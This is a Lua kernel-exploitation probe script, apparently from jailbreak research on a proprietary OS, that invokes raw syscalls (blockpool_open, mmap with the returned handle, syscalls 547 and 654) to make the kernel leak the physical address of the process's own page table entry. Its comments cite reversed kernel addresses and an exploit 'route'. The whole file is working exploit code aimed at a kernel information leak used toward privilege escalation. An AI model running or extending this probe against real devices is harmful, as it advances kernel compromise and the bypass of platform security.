-- CRASH_CLASS: MODERATE
-- PROBE 1223a: blockpool_open(653) -> mmap the handle -> type-0xb vm_object -> 547 PTE answer.
--
-- Route R1 of docs/ROUTES_III_14_10.md. Statics verified there and re-verified here:
--   653 body 0x9a7d10 allocates 0x410b0, registers type 0x11 (0x9a7ec9 mov edx,0x11), and returns
--     a small handle (0x9a7ef5 movsxd rax,[rbp-0x3c] ; 0x9a7ef9 mov [rbx+0x408],rax ; xor eax,eax).
--   0x9a77c7 mov edi,0xb is the image's only type-0xb vm_object construction.
--   547 at 0xaba5d4 takes a special branch when the object's class byte [obj+0x9d] == 0xb and
--     proc+0xc81 == 0, calling 0x8aba710 and assembling 0x18 bytes at 0xaba60c-0xaba62c.
-- If mmap accepts the handle, the blockpool pager installs a type-0xb object in our map and 547
-- starts returning the physical half of our own PTE.
--
-- One connection, each step printed before it runs. 654 is the class oracle: EINVAL before the
-- object exists, not-EINVAL after.

print("=== PROBE 1223a: blockpool handle -> type-0xb object ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function rq(a) local ok,v=pcall(function() return N(memory.read_qword(a)) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function call(tag, fn)
    local ok, rv = pcall(fn)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return nil end
    local h,l = hilo(rv)
    print(string.format("  [%s] ret=0x%08X_%08X err=%s", tag, h, l, ES()))
    return rv
end
local function dump24(tag, a)
    local s = {}
    for i = 0, 5 do local v = rd(a + i*4) s[#s+1] = string.format("%08X", v) end
    print(string.format("    %s: %s", tag, table.concat(s, " ")))
end

print(string.format("[0] pid=%d", N(mk(20)())))
local obuf = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(obuf + i, 0xDEADBEEF) end

print("[1] an anonymous control page, then 547 on it")
local ctl = N(mk(477)(uint64(0),uint64(0x4000),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)))
print(string.format("    ctl mmap -> 0x%X err=%s", ctl, ES()))
if ctl > 0x10000 then
    call("547 control", function() return mk(547)(uint64(ctl),uint64(obuf),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    dump24("control", obuf)
end

print("[2] 653 flags=0 word2=0")
for i = 0, 0x3C, 4 do wd(obuf + i, 0xDEADBEEF) end
local h = N(mk(653)(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))
print(string.format("    handle = 0x%X (%d) err=%s", h, h, ES()))

print("[3] mmap(0, 0x4000, RW, ANON|PRIVATE, fd=handle)")
local shapes = { {3, 0x1002}, {3, 0x0002}, {0x33, 0x1002}, {3, 0x0001} }
local va = 0
for i = 1, #shapes do
    local prot, flags = shapes[i][1], shapes[i][2]
    local pv = N(mk(477)(uint64(0),uint64(0x4000),uint64(prot),uint64(flags),uint64(h),uint64(0)))
    print(string.format("    prot=0x%X flags=0x%X -> 0x%X err=%s", prot, flags, pv, ES()))
    if pv > 0x10000 and pv < 0x7FFFFFFFFF then va = pv break end
end

if va == 0 then
    print("[4] mmap refused every shape; the handle is not a descriptor mmap accepts")
else
    print(string.format("[4] mapped at 0x%X, now 547 and 654", va))
    for i = 0, 0x3C, 4 do wd(obuf + i, 0xDEADBEEF) end
    call("547 mapped", function() return mk(547)(uint64(va),uint64(obuf),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    dump24("mapped", obuf)
    call("654 mapped", function() return mk(654)(uint64(va),uint64(0x4000),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    if ctl > 0x10000 then
        call("654 control", function() return mk(654)(uint64(ctl),uint64(0x4000),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    end
end
print(string.format("[Z] pid_end=%d", N(mk(20)())))
print("=== DONE ===")
